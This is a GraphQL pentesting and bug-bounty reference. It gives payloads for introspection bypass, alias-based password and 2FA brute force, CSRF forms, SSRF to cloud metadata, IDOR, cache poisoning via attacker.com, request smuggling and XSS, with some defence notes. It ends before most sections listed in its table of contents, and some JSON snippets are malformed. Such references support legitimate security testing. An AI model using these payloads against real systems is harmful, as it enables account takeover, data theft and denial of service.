# GraphQL Bug Bounty & Pentesting Knowledgebase

> **Classification**: Research-Grade | **Scope**: Black-box GraphQL Security Testing | **Last Updated**: 2026-05-24

---

## Table of Contents

- [Basics](#basics)
- [GraphQL Theory](#graphql-theory)
- [GraphQL Schema Internals](#graphql-schema-internals)
- [Introspection Abuse](#introspection-abuse)
- [Field Suggestion Attacks](#field-suggestion-attacks)
- [Alias Abuse](#alias-abuse)
- [Batching Attacks](#batching-attacks)
- [Query Depth Abuse](#query-depth-abuse)
- [Query Cost Abuse](#query-cost-abuse)
- [GraphQL CSRF Chains](#graphql-csrf-chains)
- [GraphQL SSRF Chains](#graphql-ssrf-chains)
- [GraphQL IDOR Chains](#graphql-idor-chains)
- [Authorization Bypasses](#authorization-bypasses)
- [Schema Leakage Techniques](#schema-leakage-techniques)
- [Brute Force Bypasses](#brute-force-bypasses)
- [Cache Poisoning + GraphQL Chains](#cache-poisoning--graphql-chains)
- [Request Smuggling + GraphQL Chains](#request-smuggling--graphql-chains)
- [OAuth + GraphQL Chains](#oauth--graphql-chains)
- [Browser Quirks](#browser-quirks)
- [Gadget Chains](#gadget-chains)
- [Parser Confusion Payloads](#parser-confusion-payloads)
- [Real World Case Studies](#real-world-case-studies)
- [Fuzzing Payloads](#fuzzing-payloads)
- [Automation Workflows](#automation-workflows)
- [Recon Methodology](#recon-methodology)
- [Nuclei Templates](#nuclei-templates)
- [Tools and Scanners](#tools-and-scanners)
- [Advanced Research](#advanced-research)
- [Bug Bounty Writeups](#bug-bounty-writeups)
- [Payload Collections](#payload-collections)
- [WAF Bypasses](#waf-bypasses)
- [Detection Techniques](#detection-techniques)
- [References](#references)

---

## Basics

### What is GraphQL?

GraphQL is a query language for APIs and a runtime for fulfilling those queries with existing data. Unlike REST, it exposes a single endpoint, uses strongly typed schemas, and allows clients to request exactly the fields they need.

### Key Characteristics for Attackers

| Feature | Security Implication |
|---------|---------------------|
| Single Endpoint | All attack surface concentrated at one URL |
| Strong Typing | Introspection reveals entire data model |
| Nested Queries | Deep traversal can bypass access controls at intermediate layers |
| Mutations | State-changing operations often lack CSRF protection |
| Subscriptions | WebSocket-based; may bypass HTTP-layer security controls |
| Aliases | Allow multiple same-field queries in one request |
| Batching | JSON arrays of operations bypass per-request rate limits |

### Universal Query

Every GraphQL endpoint has a reserved field `__typename` that returns the queried object's type as a string. This is the most reliable probe:

```graphql
query{__typename}
```

Expected response:
```json
{"data": {"__typename": "query"}}
```

### Common Endpoint Locations

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/v1/graphql
/v2/graphql
/graphiql
/graphql.php
/graphiql.php
/graphql/console/
/graphql/explorer
/api/v1/graphql
/playground
/altair
```

**Note**: Always probe with `/v1` appended if the base path fails.

### Request Method Testing

Production endpoints should only accept POST with `Content-Type: application/json`. Test alternatives:

```bash
# GET-based probe
curl -G "https://target.com/graphql" --data-urlencode 'query={__typename}'

# POST with form-urlencoded
curl -X POST "https://target.com/graphql"   -H "Content-Type: application/x-www-form-urlencoded"   --data 'query={__typename}'
```

If the endpoint accepts GET or `x-www-form-urlencoded`, CSRF vectors may be viable.

---

## GraphQL Theory

### Operation Types

1. **Queries**: Read operations
2. **Mutations**: Create/Update/Delete operations
3. **Subscriptions**: Real-time streaming (usually over WebSocket)

### Core Concepts

**Fields**: The unit of data requested.
```graphql
{
  user {
    id
    name
  }
}
```

**Arguments**: Parameters passed to fields.
```graphql
{
  user(id: "1") {
    name
  }
}
```

**Variables**: Dynamic values passed separately.
```graphql
query GetUser($id: ID!) {
  user(id: $id) {
    name
  }
}
```

**Aliases**: Rename the result key for duplicate fields.
```graphql
{
  firstUser: user(id: "1") { name }
  secondUser: user(id: "2") { name }
}
```

**Fragments**: Reusable field sets.
```graphql
fragment UserFields on User {
  id
  name
  email
}
```

**Directives**: Conditional inclusion (`@include`, `@skip`).
```graphql
{
  user @include(if: true) {
    name
  }
}
```

---

## GraphQL Schema Internals

### Introspection System Fields

| Field | Purpose |
|-------|---------|
| `__schema` | Access the schema metadata |
| `__type(name: String!)` | Access a specific type definition |
| `__typename` | Returns the type name of the current object |
| `__fields` | Lists fields on a type |
| `__args` | Lists arguments on a field |

### Schema Components

```graphql
# Query type - entry point for reads
type Query {
  user(id: ID!): User
  users: [User]
}

# Mutation type - entry point for writes
type Mutation {
  updateUser(id: ID!, input: UserInput!): User
}

# Object type
type User {
  id: ID!
  name: String
  email: String
  posts: [Post]
}

# Input type
type UserInput {
  name: String
  email: String
}
```

### Type Kinds (Introspection)

- `SCALAR` (String, Int, Boolean, ID, Float, custom scalars)
- `OBJECT` (User, Post)
- `INTERFACE` (abstract type)
- `UNION` (one of several types)
- `ENUM` (fixed set of values)
- `INPUT_OBJECT` (complex input)
- `LIST` (array wrapper)
- `NON_NULL` (required modifier)

---

## Introspection Abuse

### Probing for Introspection

Minimal probe to confirm introspection is enabled:
```graphql
{__schema{queryType{name}}}
```

Full introspection query (standard):
```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```

**Note**: If the above fails, remove `onOperation`, `onFragment`, and `onField` from the directives section. Many endpoints reject these legacy fields.

### Single-Line Introspection (Minimal)

```graphql
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{kind,name,description,fields(includeDeprecated:true){name,description,args{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},isDeprecated,deprecationReason},inputFields{name,description,type{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},defaultValue},interfaces{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}},enumValues(includeDeprecated:true){name,description,isDeprecated,deprecationReason},possibleTypes{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name,ofType{kind,name}}}}}}}}}}}
```

### Introspection via GET

```bash
# URL-encoded introspection probe
curl -G "https://target.com/graphql"   --data-urlencode 'query=query{__schema{queryType{name}}}'

# Full introspection via GET (URL-encoded)
curl -G "https://target.com/graphql"   --data-urlencode 'query=query{__schema{types{name}}}'
```

### Introspection Defense Bypasses

**Bypass 1: Whitespace/ newline injection**

If developers use regex to block `__schema{`, insert ignored characters:
```graphql
query{__schema
  {queryType{name}}}
```

**Bypass 2: Alternative request methods**

Introspection may be disabled on POST but enabled on GET:
```bash
curl -G "https://target.com/graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D"
```

**Bypass 3: Content-Type confusion**

Try `application/x-www-form-urlencoded`:
```bash
curl -X POST "https://target.com/graphql"   -H "Content-Type: application/x-www-form-urlencoded"   --data 'query={__schema{queryType{name}}}'
```

**Bypass 4: Case variations**

Some implementations check case-sensitively:
```graphql
{__Schema{queryType{name}}}
{__SCHEMA{QUERYTYPE{NAME}}}
```

**Bypass 5: Unicode normalization**

Use Unicode equivalents that normalize to `__schema`:
```graphql
{＿＿schema{queryType{name}}}  # Fullwidth underscore
{__ｓｃｈｅｍａ{queryType{name}}}  # Mixed fullwidth
```

**Bypass 6: Directive wrapping**

```graphql
query @skip(if: false) { __schema { queryType { name } } }
```

**Bypass 7: Fragment-based extraction**

```graphql
query { ...SchemaFragment }
fragment SchemaFragment on Query { __schema { queryType { name } } }
```

### Type Enumeration

Once introspection is partially available, enumerate specific types:
```graphql
{__type(name: "User") { name fields { name type { name kind ofType { name kind } } } }}
```

### Visualizing Introspection

Use tools to convert introspection JSON to interactive graphs:
- `graphql-voyager` (IvanGoncharov)
- `altair` (client IDE)
- `insomnia` (built-in schema explorer)

---

## Field Suggestion Attacks

### Apollo Server Suggestions

When introspection is disabled, Apollo may leak schema details via suggestion error messages:

**Trigger:**
```graphql
{ productInfo { name } }
```

**Leak:**
```json
{
  "errors": [{
    "message": "Cannot query field "productInfo" on type "Query". Did you mean "productInformation" or "productDetails"?"
  }]
}
```

### Automated Schema Recovery (Clairvoyance)

`clairvoyance` (nikitastupin) uses field suggestions to brute-force the schema:

```bash
# Install
pip install clairvoyance

# Run against endpoint with suggestions enabled
python -m clairvoyance "https://target.com/graphql" -o schema.json

# With wordlist enhancement
python -m clairvoyance "https://target.com/graphql"   -w graphql-wordlist.txt -o schema.json
```

**Wordlist sources:**
- `Escape-Technologies/graphql-wordlist`
- `danielmiessler/SecLists/Discovery/Web-Content/graphql.txt`

### Disabling Suggestions (Defense Reference)

- **Apollo Server v4+**: `hideSchemaDetailsFromClientErrors: true`
- **Apollo Server <v4**: Custom formatError function to strip suggestions
- **graphql-js**: Override `didYouMean` in validation errors

### Manual Suggestion Brute-Force

```bash
# Fuzz field names and capture suggestions
for word in $(cat wordlist.txt); do
  curl -s -X POST "https://target.com/graphql"     -H "Content-Type: application/json"     -d "{"query":"{ $word { id } }"}" | jq '.errors[0].message'
done
```

---

## Alias Abuse

### Brute-Force Amplification

Aliases allow multiple queries with the same field name in a single HTTP request. This bypasses rate limiters that count HTTP requests rather than operations.

**Password brute-force via aliases:**
```graphql
mutation {
  login1: login(username: "admin", password: "password1") { token }
  login2: login(username: "admin", password: "password2") { token }
  login3: login(username: "admin", password: "password3") { token }
  login4: login(username: "admin", password: "password4") { token }
  login5: login(username: "admin", password: "password5") { token }
}
```

**Discount code brute-force:**
```graphql
query {
  isValidDiscount(code: "CODE1") { valid }
  isValidDiscount2: isValidDiscount(code: "CODE2") { valid }
  isValidDiscount3: isValidDiscount(code: "CODE3") { valid }
  isValidDiscount4: isValidDiscount(code: "CODE4") { valid }
  isValidDiscount5: isValidDiscount(code: "CODE5") { valid }
}
```

**2FA bypass (OTP brute-force):**
```graphql
mutation {
  verify1: verify2FA(code: "000000") { success }
  verify2: verify2FA(code: "000001") { success }
  # ... up to 100 aliases per request
}
```

### Alias + Batching Combined

```json
[
  {
    "query": "mutation { a1: login(user:"admin", pass:"pwd1") { token } a2: login(user:"admin", pass:"pwd2") { token } }"
  },
  {
    "query": "mutation { a3: login(user:"admin", pass:"pwd3") { token } a4: login(user:"admin", pass:"pwd4") { token } }"
  }
]
```

This sends 4 login attempts in 1 HTTP request.

### Defense: Operation Limits

Implement limits on:
- Maximum aliases per operation
- Maximum unique fields per operation
- Maximum root fields per operation

---

## Batching Attacks

### JSON List Batching

GraphQL servers may accept an array of operations in a single POST body:

```json
[
  {
    "query": "query { user(id: "1") { name } }"
  },
  {
    "query": "query { user(id: "2") { name } }"
  },
  {
    "query": "mutation { deleteUser(id: "3") { success } }"
  }
]
```

**Impact**: 
- Rate limit bypass (1 HTTP request = N operations)
- Mixed authorization contexts (if batch items aren't individually validated)
- State inconsistency (partial failures)

### Query Name Batching (Operation Batching)

Some servers allow multiple named operations in a single query document:

```graphql
query BatchOps {
  op1: user(id: "1") { name }
  op2: user(id: "2") { name }
  op3: user(id: "3") { name }
}
```

### Mutation Batching

```graphql
mutation {
  create1: createPost(title: "A") { id }
  create2: createPost(title: "B") { id }
  create3: createPost(title: "C") { id }
}
```

**Bounty Tip**: If the application enforces "one action per minute" but accepts batching, you can bypass temporal restrictions.

### Batching + Variable Injection

```json
[
  {
    "query": "query($id: ID!) { user(id: $id) { email } }",
    "variables": {"id": "1"}
  },
  {
    "query": "query($id: ID!) { user(id: $id) { email } }",
    "variables": {"id": "2"}
  }
]
```

---

## Query Depth Abuse

### Deep Recursion DoS

GraphQL allows arbitrary nesting. If depth limits are not enforced, expensive queries can exhaust server resources.

```graphql
query DeepNesting {
  user {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      name
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

**Impact**: CPU/memory exhaustion, database connection pool depletion.

### Circular Type Abuse

If types reference each other (User -> Post -> Author -> Post -> ...), infinite-depth queries are syntactically valid:

```graphql
query Circular {
  user {
    posts {
      author {
        posts {
          author {
            posts {
              title
            }
          }
        }
      }
    }
  }
}
```

### Depth Limit Bypass

Some depth calculators only count explicit nesting, missing fragments:

```graphql
query {
  user {
    ...DeepFields
  }
}

fragment DeepFields on User {
  posts {
    author {
      posts {
        author {
          name
        }
      }
    }
  }
}
```

---

## Query Cost Abuse

### Complexity Analysis Bypass

Servers may implement cost analysis to drop expensive queries. Bypass techniques:

**1. Fragment-based complexity hiding:**
```graphql
query {
  user {
    ...AllFields
  }
}
fragment AllFields on User {
  posts {
    comments {
      author {
        posts {
          comments {
            content
          }
        }
      }
    }
  }
}
```

**2. Alias-based cost multiplication:**
```graphql
query {
  a1: user { posts { title } }
  a2: user { posts { title } }
  a3: user { posts { title } }
  # ... 100 aliases
}
```

**3. Directive-based conditional execution:**
```graphql
query {
  user @include(if: true) {
    posts {
      comments {
        author {
          posts {
            comments {
              content
            }
          }
        }
      }
    }
  }
}
```

### Resource Exhaustion via Lists

```graphql
query {
  users(first: 10000) {
    posts(first: 10000) {
      comments(first: 10000) {
        content
      }
    }
  }
}
```

**Note**: Combine with `after` cursors to paginate through massive datasets in a single request.

---

## GraphQL CSRF Chains

### Vulnerability Conditions

CSRF over GraphQL arises when:
1. The endpoint accepts non-JSON content types (`x-www-form-urlencoded`, `multipart/form-data`)
2. OR the endpoint accepts GET requests with query parameters
3. AND no CSRF tokens are validated
4. AND cookies are automatically sent (same-site lax/none)

### Attack: GET-based CSRF

```html
<!-- Image tag CSRF -->
<img src="https://target.com/graphql?query=mutation%7BdeleteAccount%7Bid%7D%7D">

<!-- iframe CSRF -->
<iframe src="https://target.com/graphql?query=mutation{updateEmail(email:"attacker@evil.com"){id}}"></iframe>
```

### Attack: POST form-based CSRF

```html
<form action="https://target.com/graphql" method="POST" enctype="text/plain">
  <input name='{"query": "mutation { changePassword(oldPassword: "old", newPassword: "pwned") { success } }", "variables": {}' value='x'>
  <input type="submit" value="Click">
</form>
```

**Note**: `text/plain` content-type may bypass JSON-only validation if the server doesn't strictly check.

### Attack: x-www-form-urlencoded CSRF

```html
<form action="https://target.com/graphql" method="POST">
  <input type="hidden" name="query" value="mutation { transferFunds(to: "attacker", amount: 9999) { success } }">
  <input type="submit" value="Click to win">
</form>
```

### Advanced CSRF: JSON with trailing garbage

Some parsers accept JSON with trailing form data:
```html
<form action="https://target.com/graphql" method="POST" enctype="text/plain">
  <textarea name='{"query":"mutation{updateEmail(email:"attacker@evil.com"){id}}"}'>
  </textarea>
</form>
```

### GraphQL CSRF + CORS Misconfiguration

If the endpoint has `Access-Control-Allow-Origin: *` and accepts credentials:
```javascript
fetch("https://target.com/graphql", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({
    query: `mutation { deleteUser(id: "victim") { success } }`
  })
});
```

### Defense Checklist

- Only accept POST with `Content-Type: application/json`
- Validate Content-Type strictly (no charset bypasses)
- Implement CSRF tokens or SameSite=Strict cookies
- Reject GET mutations

---

## GraphQL SSRF Chains

### URI-Based Query SSRF

Some GraphQL implementations allow fetching schemas or data from remote URLs:

```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

If the server supports schema stitching or remote introspection:
```graphql
query {
  _service {
    sdl
  }
}
```

### File Upload SSRF (Multipart)

GraphQL multipart spec allows file uploads. If the server processes URLs in file metadata:
```graphql
mutation {
  uploadFile(file: {
    url: "http://169.254.169.254/latest/meta-data/"
  }) {
    id
  }
}
```

### Directive-Based SSRF

Custom directives may trigger HTTP requests:
```graphql
query {
  user @cacheControl(maxAge: 0, scope: PRIVATE) {
    name
  }
}
```

### Introspection URL Injection

If the GraphQL gateway proxies to backend services by URL:
```graphql
query {
  __schema {
    queryType {
      name
    }
  }
}
```

With header injection:
```bash
curl -X POST "https://target.com/graphql"   -H "Content-Type: application/json"   -H "X-Backend-URL: http://internal.service:8080/graphql"   -d '{"query": "{ __typename }"}'
```

### SSRF via Custom Scalars

URL scalars that validate but still fetch:
```graphql
mutation {
  createWebhook(url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/") {
    id
  }
}
```

### Cloud Metadata Extraction Chain

```graphql
query {
  user {
    avatar(url: "http://169.254.169.254/latest/meta-data/")
  }
}
```

---

## GraphQL IDOR Chains

### Direct Object Reference via Arguments

```graphql
query {
  product(id: 3) {
    id
    name
    listed
    internalNotes
  }
}
```

**Bounty Chain**: 
1. Query `products` to get listed items (IDs 1, 2, 4)
2. Infer ID 3 exists but is delisted
3. Query `product(id: 3)` directly to access delisted/private data

### IDOR via Node Interface (Relay)

Relay-style `node(id: ID!)` interface provides global object access:
```graphql
query {
  node(id: "VXNlcjox") {  # base64("User:1")
    ... on User {
      email
      ssn
    }
  }
}
```

**Decode base64 IDs** to predict other objects:
```bash
echo "VXNlcjox" | base64 -d  # User:1
echo "UG9zdDox" | base64 -d  # Post:1
```

### IDOR via Nested Relationships

```graphql
query {
  user(id: "public-user") {
    posts {
      author {
        email  # Leaks post author's email even if not the queried user
      }
    }
  }
}
```

### IDOR via Mutation Arguments

```graphql
mutation {
  updateUser(id: "other-user-id", input: { email: "attacker@evil.com" }) {
    id
  }
}
```

### IDOR via Search/Filters

```graphql
query {
  users(filter: { email_contains: "@company.com" }) {
    email
    password
  }
}
```

---

## Authorization Bypasses

### Field-Level Authorization Bypass

The API checks query-level auth but not field-level:
```graphql
query {
  me {
    name
    email
    adminNotes  # Should require admin but doesn't
    internalFlags
  }
}
```

### Type-Level Authorization Bypass

```graphql
query {
  user(id: "1") {
    name
    ... on Admin {
      secretKey  # Inline fragment bypasses if type-check is missing
    }
  }
}
```

### Mutation Authorization Bypass

```graphql
mutation {
  deleteUser(id: "1") {
    success
  }
}
```

If the mutation resolver checks auth on the mutation field but not on the returned type, nested data may leak.

### Bypass via Interface/Union Fragments

```graphql
query {
  node(id: "1") {
    ... on User {
      email
    }
    ... on AdminUser {
      apiKeys
    }
  }
}
```

### Bypass via Introspection -> Hidden Fields

Use introspection to find fields not exposed in the frontend, then query them directly:
```graphql
query {
  user {
    name
    creditCardNumber  # Hidden from frontend schema but exists in API
  }
}
```

### Bypass via Query Rewriting

Some gateways strip dangerous fields but miss aliases:
```graphql
query {
  user {
    name
    x: password  # WAF/gateway sees 'x', not 'password'
  }
}
```

---

## Schema Leakage Techniques

### Introspection (Primary)

See [Introspection Abuse](#introspection-abuse) section.

### Suggestion-Based Leakage

See [Field Suggestion Attacks](#field-suggestion-attacks) section.

### Error Message Leakage

Verbose errors reveal schema internals:
```graphql
{ nonExistentField }
```

Response:
```json
{
  "errors": [{
    "message": "Cannot query field 'nonExistentField' on type 'Query'. Available fields: user, users, post, posts, adminPanel",
    "locations": [{"line": 1, "column": 3}],
    "extensions": {
      "code": "GRAPHQL_VALIDATION_FAILED"
    }
  }]
}
```

### Stack Trace Leakage

Development mode may return stack traces:
```json
{
  "errors": [{
    "message": "Internal server error",
    "extensions": {
      "exception": {
        "stacktrace": [
          "Error: User.findById is not a function",
          "    at /app/resolvers/user.js:42:12"
        ]
      }
    }
  }]
}
```

### Timing-Based Enumeration

```bash
# Valid field vs invalid field timing differences
time curl -X POST "https://target.com/graphql"   -d '{"query": "{ user { name } }"}'

time curl -X POST "https://target.com/graphql"   -d '{"query": "{ user { invalidField } }"}'
```

### Response Size-Based Enumeration

Valid queries return larger responses than invalid ones. Use binary search to enumerate fields.

---

## Brute Force Bypasses

### Alias-Based Rate Limit Bypass

See [Alias Abuse](#alias-abuse) section.

### Batching-Based Rate Limit Bypass

See [Batching Attacks](#batching-attacks) section.

### IP Rotation + GraphQL

Combine with proxy pools since the rate limit is per-operation, not per-IP:
```bash
# Using proxychains + aliases
proxychains curl -X POST "https://target.com/graphql"   -d '{"query": "mutation { a1: login(user:"admin",pass:"pwd1") { token } a2: login(user:"admin",pass:"pwd2") { token } }"}'
```

### Distributed Brute-Force via BatchQL

```bash
# batchql - sends batched password attempts
python batchql.py -u "https://target.com/graphql"   -w passwords.txt   -q 'mutation { login(username: "admin", password: "%s") { token } }'
```

### CrackQL

```bash
# CrackQL - GraphQL password brute-force and fuzzing
python crackql.py -u "https://target.com/graphql"   -q queries/login.graphql   -w wordlists/passwords.txt
```

---

## Cache Poisoning + GraphQL Chains

### Cache Key Fundamentals

Web caches identify resources using **cache keys** (method, path, query string, Host header). **Unkeyed inputs** (headers, cookies, body) can affect the response without affecting the cache key.

### GraphQL + Cache Poisoning Attack Chain

**Step 1**: Identify cache oracle (cacheable page with hit/miss indicator).

**Step 2**: Find unkeyed input affecting GraphQL response.

**Step 3**: Poison cache with malicious GraphQL query.

**Step 4**: Victims receive poisoned response.

### X-Forwarded-Host + GraphQL

```bash
GET /graphql HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/json

{"query": "{ user { name avatar } }"}
```

If the API uses `X-Forwarded-Host` to generate avatar URLs:
```json
{
  "data": {
    "user": {
      "name": "Admin",
      "avatar": "https://attacker.com/avatar.jpg"
    }
  }
}
```

### Cache Parameter Cloaking

When caches exclude specific parameters (e.g., `utm_content`), exploit URL parsing quirks:

**Varnish regex bypass:**
```
GET /graphql?q=help?!&search=1
GET /graphql?q=help?_=payload&!&search=1
```

**Rails ; delimiter:**
```
GET /graphql?callback=legit&utm_content=x;callback=alert(1)//
```

### Fat GET Poisoning

If the cache forwards GET body but doesn't include it in the cache key:
```
GET /graphql?query={user{name}} HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

query={user{name,password}}
```

The cache key is based on `query={user{name}}` but the backend processes `query={user{name,password}}`.

### Internal Cache Poisoning (Fragment Caches)

Application-level caches (WP Rocket, template caches) cache fragments. Poisoning affects all pages containing that fragment:
```graphql
mutation {
  updateProfile(input: { bio: "<script>alert(1)</script>" }) {
    bio
  }
}
```

If the bio is cached and rendered on every page, XSS affects all visitors.

### GraphQL + DOM Poisoning

If a GraphQL response sets `data-site-root` via unkeyed header:
```bash
GET /graphql HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
```

JavaScript uses this to load i18n files:
```javascript
fetch("https://attacker.com/api/i18n/en")
```

Poison the i18n file to translate phrases into XSS:
```json
{"Show more": "<svg onload=alert(1)>"}
```

---

## Request Smuggling + GraphQL Chains

### CL.TE Smuggling to GraphQL

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

The front-end reads `Content-Length: 6` (body: `0

G`), the back-end reads chunked (`0` = end), leaving `G` to prefix the next request.

### TE.CL Smuggling to GraphQL

```http
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 4
Transfer-Encoding: chunked

5c
POST /graphql HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 50

{"query": "mutation { deleteAccount { id } }"}
0

```

### GraphQL-Specific Smuggling Gadgets

**Fat GET via smuggling:**
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 7
Transfer-Encoding: chunked

0

GET /graphql HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

query={user{name,password}} HTTP/1.1
Host: target.com

```

### Browser-Powered Desync

Use browser behaviors to trigger desync to GraphQL endpoints:
```html
<form action="https://target.com/graphql" method="POST" enctype="text/plain">
  <textarea name="GET /admin HTTP/1.1
Foo: bar">x</textarea>
</form>
```

### Smuggler + GraphQL

```bash
# Detect smuggling on GraphQL endpoint
python smuggler.py -u "https://target.com/graphql" -m CL.TE

# Burp Extension: HTTP Request Smuggler
# Target: /graphql
# Method: Issue single-packet attack
```

---

## OAuth + GraphQL Chains

### Hidden OAuth Attack Vectors

GraphQL APIs often act as OAuth resource servers. Attack vectors:

**1. GraphQL introspection leaks OAuth client secrets:**
```graphql
{ __type(name: "OAuthClient") { fields { name } } }
```

**2. Mutation-based OAuth scope escalation:**
```graphql
mutation {
  updateOAuthApp(id: "app1", scopes: ["admin", "user", "billing"]) {
    id
  }
}
```

**3. GraphQL query param reflection in OAuth redirect:**
```graphql
query {
  oauthAuthorize(redirectUri: "https://attacker.com/callback") {
    url
  }
}
```

**4. OAuth state parameter injection via GraphQL:**
```graphql
query {
  oauthUrl(state: "<script>alert(1)</script>") {
    url
  }
}
```

**5. Access token generation via GraphQL mutation:**
```graphql
mutation {
  generateToken(clientId: "x", clientSecret: "y", scope: "admin") {
    token
  }
}
```

### OAuth + GraphQL + CSRF Chain

```html
<form action="https://target.com/graphql" method="POST">
  <input type="hidden" name="query" value='mutation { authorizeOAuth(appId: "malicious", scope: "full") { code } }'>
</form>
```

---

## Browser Quirks

### Fetch API Behaviors

**1. CORS Preflight + GraphQL:**
- `Content-Type: application/json` triggers preflight
- `text/plain` or `x-www-form-urlencoded` may not
- If the server accepts non-JSON but doesn't validate, CSRF is possible

**2. Credentials mode:**
```javascript
fetch("/graphql", {
  credentials: "include",  // Sends cookies
  headers: {"Content-Type": "application/json"}
});
```

**3. Redirect handling:**
GraphQL responses with 302 redirects may be followed automatically, exposing auth codes.

### Form Submission Behaviors

**1. text/plain encoding:**
Browsers send form data as `key=value` lines. Some GraphQL parsers accept this:
```
query={__typename}
```

**2. multipart/form-data:**
File uploads via GraphQL multipart spec. Boundary injection possible.

### Cookie Behaviors

**SameSite=None**: Required for cross-origin GraphQL requests with credentials. If missing, cookies won't be sent.

**SameSite=Lax**: POST requests from cross-origin navigations are blocked after Chrome 80+.

**SameSite=Strict**: Complete CSRF protection for modern browsers.

### Encoding Quirks

**1. URL encoding in GET queries:**
```
GET /graphql?query=%7B__typename%7D
```

**2. Double URL encoding:**
```
GET /graphql?query=%257B__typename%257D
```

**3. Unicode normalization:**
```
query={＿＿typename}  # Fullwidth underscore U+FF3F
```

---

## Gadget Chains

### Reflected XSS via GraphQL Error

```graphql
{ user(name: "<script>alert(1)</script>") { id } }
```

If the error message reflects the invalid input:
```json
{
  "errors": [{
    "message": "User '<script>alert(1)</script>' not found"
  }]
}
```

### Open Redirect via GraphQL

```graphql
query {
  redirect(url: "//attacker.com") {
    destination
  }
}
```

### HTML Injection via Description Fields

Introspection `description` fields may contain HTML/Markdown:
```graphql
{ __type(name: "User") { description } }
```

If rendered in documentation:
```html
<img src=x onerror=alert(1)>
```

### CSS Injection via GraphQL

```graphql
query {
  theme(css: "}*{color:red;}/*") {
    stylesheet
  }
}
```

### JSONP Gadget

If GraphQL response is reflected in JSONP callback:
```
GET /graphql?callback=attackerFunction&query={user{name}}
```

Response:
```javascript
attackerFunction({"data": {"user": {"name": "Admin"}}})
```

### postMessage Gadgets

GraphQL responses rendered in iframes may use `postMessage`. If origin checks are missing:
```javascript
window.parent.postMessage({"graphqlResponse": data}, "*");
```

---

## Parser Confusion Payloads

### Unicode Confusion

```graphql
{ ＿＿schema { queryType { name } } }   # Fullwidth underscore
{ __ｓｃｈｅｍａ { queryType { name } } }  # Fullwidth letters
{ __schеma { queryType { name } } }     # Cyrillic 'е' (U+0435)
```

### Comment Injection

```graphql
query {
  user {
    name
    # password  # Commented out but may confuse parsers
    email
  }
}
```

### Null Byte Injection

```graphql
query { user { name\x00password } }
```

### Double Encoding

```graphql
query { user { name %00 password } }
```

### GraphQL over JSON Parsing Confusion

```json
{
  "query": "{ user { name } }",
  "variables": {
    "id": "1\x00admin"
  }
}
```

### Content-Type Confusion

```bash
# Send JSON body with text/plain header
curl -X POST "https://target.com/graphql"   -H "Content-Type: text/plain"   -d '{"query": "{ __typename }"}'

# Send with charset confusion
curl -X POST "https://target.com/graphql"   -H "Content-Type: application/json; charset=utf-7"   -d '+ACsAew-__typename+AH0-'
```

---

## Real World Case Studies

### Case Study 1: HackerOne GraphQL Introspection (2017)

**Finding**: Introspection enabled on production GraphQL API leaked internal bug report fields.
**Impact**: Full schema disclosure including `Team.internalNotes` and `Report.bountyAmount`.
**Fix**: Introspection disabled + field-level authorization added.

### Case Study 2: Shopify GraphQL Batching (2019)

**Finding**: JSON list batching allowed 1000 operations per request.
**Impact**: Bypassed rate limits for inventory checking, leading to competitive intelligence leakage.
**Fix**: Operation complexity analysis + batch size limits.

### Case Study 3: GitHub GraphQL Cursor Injection (2020)

**Finding**: Pagination cursors were decryptable, revealing internal database offsets.
**Impact**: IDOR via cursor manipulation to access other users' private repositories.
**Fix**: Cursor encryption with HMAC.

### Case Study 4: Mozilla SHIELD Cache Poisoning (2018)

**Finding**: `X-Forwarded-Host` caused Firefox update system to fetch from attacker server.
**Impact**: Potential mass extension installation or update blocking.
**Fix**: Header validation + cache key hardening.

### Case Study 5: GraphQL CSRF on Payment API (2021)

**Finding**: GraphQL endpoint accepted `x-www-form-urlencoded` POST without CSRF tokens.
**Impact**: Mass fund transfer via malicious form submission.
**Fix**: Strict Content-Type validation + SameSite cookies.

